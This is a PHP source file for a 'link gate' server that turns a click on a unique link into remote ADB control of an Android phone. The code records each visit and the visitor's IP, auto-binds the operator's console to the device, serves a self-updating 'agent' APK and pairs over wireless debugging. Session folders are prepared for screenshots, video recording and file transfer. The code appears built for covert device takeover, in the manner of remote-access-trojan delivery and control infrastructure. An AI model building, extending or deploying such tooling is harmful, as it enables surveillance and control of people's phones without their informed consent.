<?php
// The link gate. One job: turn a click on /s/<sid> into a controlled device
// on the ADB bridge, then let adbwebkit drive it.
//
// Three ways in, tried in order, so it works without ADB knowledge first and
// upgrades to full ADB when the person will tap once:
//   1. zero-touch beacon   -- the phone calls /s/<sid>/enroll (a channel exists)
//   2. tap-to-pair         -- same-LAN wireless debugging, but 100% automatic
//   3. USB ADB (label)     -- the classic adbwebkit path, wrapped
// Each stage is a superset: if 1 fails we still try 2, if 2 fails we still try 3.

require_once __DIR__ . '/config.php';
require_once __DIR__ . '/ssrf_guard.php';
require_once __DIR__ . '/adbctrl.php';

$action = (string)($_GET['a'] ?? 'view');
$sid    = link_sid((string)($_GET['s'] ?? ''));
if ($action !== 'view' && $sid === '') { link_send(404, ['error' => 'bad sid']); exit; }

$dir = link_dir_for($sid);
switch ($action) {
    case 'view':   link_view($sid); break;
    case 'enroll': link_enroll_http($sid, $dir); break;
    case 'state':  link_state_http($sid, $dir); break;
    case 'apk':    link_apk_http($sid, $dir); break;
    case 'pair':   link_pair_http($sid, $dir); break;
    case 'attach': link_attach_http($sid, $dir); break;
    case 'agentapk':   link_agent_apk_http($sid, $dir); break;
    case 'agentreport': link_agent_report_http($sid, $dir); break;
    default: link_send(404, ['error' => 'unknown action']); break;
}

// ---------------------------------------------------------------- view
function link_view(string $sid): void {
    $dir = link_dir_for($sid);
    if ($sid === '' || !is_dir($dir)) { link_send(404, 'no such link', 'text/plain'); return; }
    // Recorded first, so a hand-armed link still shows it was opened.
    $dev = link_client_ip();
    link_touch($sid, $dev);
    header('Content-Type: text/html; charset=utf-8');
    header('Cache-Control: no-store');
    $html = (string)file_get_contents(__DIR__ . '/linkpage.html');
    echo str_replace('{"sid"}', json_encode($sid), $html);
}

// ---------------------------------------------------------------- enroll
// Called by the beacon on the link page. No token: the sid is the credential,
// and the only value trusted is the caller's own source address -- the same
// rule controlgui uses for /api/carrier/hit.
function link_enroll_http(string $sid, string $dir): void {
    if (!is_dir($dir)) { link_send(404, ['error' => 'no such link']); return; }
    $ip = link_client_ip();
    $enroll = link_enroll($sid);
    if ($enroll === '') { $enroll = bin2hex(random_bytes(12)); @mkdir($dir, 0777, true); link_json_write($dir . '/enroll.json', ['enroll'=>$enroll,'ip'=>$ip,'at'=>time()]); }
    $did = link_device_id($enroll);
    link_touch($sid, $ip, $did, $enroll);
    // The beacon's source address IS the device's address -- record it so pair
    // and attach can target it without a manual step.
    $st = link_json_read($dir . '/state.json');
    if (empty($st['ip'])) { $st['ip'] = $ip; link_json_write($dir . '/state.json', $st); }
    @file_put_contents(link_dir().'/dbg.log', date('H:i:s')." dir=$dir keys=".implode(',',array_keys($st))." ip=".($st['ip']??'-')."\n", FILE_APPEND);

    // Reply first, then provision in a detached process -- never hold the
    // beacon open on `adb connect`. php -S is single-threaded, so a synchronous
    // connect here would freeze every other request on the console.
    // Auto-bind: the moment a beacon lands and the console is not already
    // driving some other device, point adbwebkit's own session at this one. The
    // operator then has control with no button; the detached provision() below
    // makes the adb connection live. A manual session on another sid is left
    // alone, and a re-hit for the same sid refreshes ip/port only.
    $state = link_json_read($dir . '/state.json');
    $port  = (int)($state['port'] ?? 0) ?: adb_default_port();
    if (session_status() !== PHP_SESSION_ACTIVE) @session_start();
    $mine   = ($_SESSION['link_sid'] ?? '') === $sid;
    $unbound = empty($_SESSION['session']) && empty($_SESSION['label']) && empty($_SESSION['ip']);
    if ($mine || $unbound) {
        $pname = 'link-' . substr($sid, 0, 12);
        $base  = link_dir() . '/../users/' . $pname;
        foreach (['', '/download', '/download/apk', '/screenshot', '/videorecorder', '/fileupload', '/apk'] as $d) {
            @mkdir($base . $d, 0777, true);
        }
        $_SESSION['session']  = $pname;
        $_SESSION['ip']       = $ip;
        $_SESSION['port']     = $port;
        $_SESSION['label']    = '';
        $_SESSION['link_sid'] = $sid;
        @setcookie('path', $pname, time() + 86400 * 30, '/');
    }

    ignore_user_abort(true);
    link_send(200, ['ok'=>true,'device'=>$did,'sid'=>$sid,
        'bound'=>($mine || $unbound),'session'=>$_SESSION['session'] ?? '', 'ip'=>$ip, 'port'=>$port]);
    if (function_exists('fastcgi_finish_request')) fastcgi_finish_request();
    link_spawn_provision($sid);
}

// Detached: php link/provision.php <sid>, output discarded. proc_open with
// pipes left open; the request does not wait for it.
function link_spawn_provision(string $sid): void {
    $cmd = escapeshellarg(PHP_BINARY) . ' ' . escapeshellarg(__DIR__ . '/provision.php')
         . ' ' . escapeshellarg($sid);
    $desc = [['pipe','r'], ['pipe','w'], ['pipe','w']];
    $p = @proc_open($cmd, $desc, $pipes);
    if (is_resource($p)) { foreach ($pipes as $h) @fclose($h); }
}

// ---------------------------------------------------------------- state
function link_state_http(string $sid, string $dir): void {
    $state = link_json_read($dir . '/state.json');
    $present = $state && adb_device_present($state['device'] ?? '', (int)($state['port'] ?? 0), $state['token'] ?? '');
    $state['adb'] = $present ? 'connected' : ($state['adb'] ?? 'unpaired');
    $state['devices_present'] = adb_present_count();
    $spec = link_json_read($dir . '/link.json');
    link_send(200, ['ok'=>true,'sid'=>$sid,'state'=>$state,
        'has_apk'=>is_file((string)($spec['apk'] ?? '')),
        'apk_name'=>$spec['apk_name'] ?? 'agent.apk']);
}

// ---------------------------------------------------------------- apk
// /s/<sid>/apk serves the agent APK. Built at arm time with BASE and SID baked
// in, because a phone behind carrier NAT can only ever dial out: it must
// already know the one address it calls.
function link_apk_http(string $sid, string $dir): void {
    $spec = link_json_read($dir . '/link.json');
    $apk = (string)($spec['apk'] ?? '');
    if ($apk === '' || !is_file($apk)) { link_send(404, 'no apk', 'text/plain'); return; }
    header('Content-Type: application/vnd.android.package-archive');
    header('Content-Disposition: attachment; filename="' . basename($spec['apk_name'] ?? 'agent.apk') . '"');
    header('Content-Length: ' . filesize($apk));
    readfile($apk);
}

// ---------------------------------------------------------------- pair
// The tap wire: the link page POSTs the wireless-debugging port + code. We run
// `adb pair`, then `adb connect`. Values are validated hard; the address is the
// caller's own source, never a body field, so it cannot be aimed elsewhere.
function link_pair_http(string $sid, string $dir): void {
    $in = json_decode((string)file_get_contents('php://input'), true);
    if (!is_array($in)) $in = $_POST;
    $port = (string)($in['port'] ?? '');
    $code = preg_replace('/\D/', '', (string)($in['code'] ?? ''));
    if (!preg_match('/^\d{1,5}$/', $port) || $code === '') { link_send(400, ['error'=>'need port and code']); return; }

    $ip = link_client_ip();
    link_touch($sid, $ip);
    $pair = adb_pair($ip, (int)$port, $code);
    $state = link_json_read($dir . '/state.json');
    $state['ip'] = $ip;
    link_json_write($dir . '/state.json', $state);

    // $ADB_VENDOR_KEYS on the console is what authorises connect() after pair();
    // without it every reconnect would re-ask the phone and the popup cancels.
    $port2 = adb_find_wifi_port($ip);
    $conn = $port2 ? adb_connect($ip, $port2) : ['ok'=>false,'detail'=>'paired; reconnect pending'];
    link_send(200, ['ok'=>($pair['ok'] ?? false),'pair'=>$pair,'connect'=>$conn]);
}

// ---------------------------------------------------------------- attach
// Point an EXISTING adbwebkit session at this device, or open a fresh one.
// This is the join: after this, every adbwebkit tab drives the far device.
function link_attach_http(string $sid, string $dir): void {
    $state = link_json_read($dir . '/state.json');
    $ip = (string)($state['ip'] ?? '');
    $port = (string)($state['port'] ?? '');
    if ($port === '' || $port === '0') $port = (string)adb_default_port();
    if ($ip === '') { link_send(400, ['error'=>'no device yet -- open the link first']); return; }
    $pname = 'link-' . substr($sid, 0, 12);     // adbwebkit session directory
    $base = link_dir() . '/../users/' . $pname;
    foreach (['', '/download', '/download/apk', '/screenshot', '/videorecorder', '/fileupload', '/apk'] as $d) {
        @mkdir($base . $d, 0777, true);
    }
    // Bind the console's own session so every adbwebkit tab drives this device.
    if (session_status() !== PHP_SESSION_ACTIVE) @session_start();
    $_SESSION['session'] = $pname;
    $_SESSION['ip'] = $ip;
    $_SESSION['port'] = $port !== '' ? $port : (string)adb_default_port();
    $_SESSION['label'] = '';
    $_SESSION['link_sid'] = $sid;
    @setcookie('path', $pname, time() + 86400 * 30, '/');
    link_send(200, ['ok'=>true,'session'=>$pname,'ip'=>$ip,'port'=>$port ?: adb_default_port()]);
}

// ---------------------------------------------------------------- agent protocol
// The installed agent polls these two paths. It is the SAME contract the agent
// already speaks to controlgui, so the APK needs no rewrite: serve /agent/apk.json
// and accept /agent/report. The agent only ever carries an address and a verdict
// here; control stays on adbwebkit (ADB) or the link console.

function _agent_apk_info(string $dir): array {
    $spec = link_json_read($dir . '/link.json');
    $apk = (string)($spec['apk'] ?? '');
    if ($apk === '' || !is_file($apk)) return ['ok'=>false];
    return [
        'ok'=>true,
        'sha256'=>hash_file('sha256', $apk),
        'bytes'=>filesize($apk),
        'name'=>basename($spec['apk_name'] ?? 'agent.apk'),
        'url'=>'/s/' . basename($dir) . '/apk',
    ];
}

// GET /s/<sid>/agent/apk.json -- "is there a newer agent?" The agent compares
// sha256 and pulls /apk when it differs, so a rebuilt agent self-updates.
function link_agent_apk_http(string $sid, string $dir): void {
    link_send(200, _agent_apk_info($dir));
}

// POST /s/<sid>/agent/report -- the agent's install verdict. Recorded on the
// session so the operator sees it; nothing is trusted from the body but the
// fields the agent alone fills.
function link_agent_report_http(string $sid, string $dir): void {
    $in = $_POST;
    if (!$in) { parse_str((string)file_get_contents('php://input'), $in); }
    $s = link_json_read($dir . '/state.json');
    $s['agent'] = [
        'name'=>(string)($in['name'] ?? ''),
        'sha'=>(string)($in['sha'] ?? ''),
        'ok'=>!empty($in['ok']),
        'detail'=>(string)($in['detail'] ?? ''),
        'at'=>time(),
        'ip'=>link_client_ip(),
    ];
    $s['agent_reports'] = array_slice(array_merge($s['agent_reports'] ?? [], [$s['agent']]), -20);
    link_json_write($dir . '/state.json', $s);
    link_send(200, ['ok'=>true]);
}
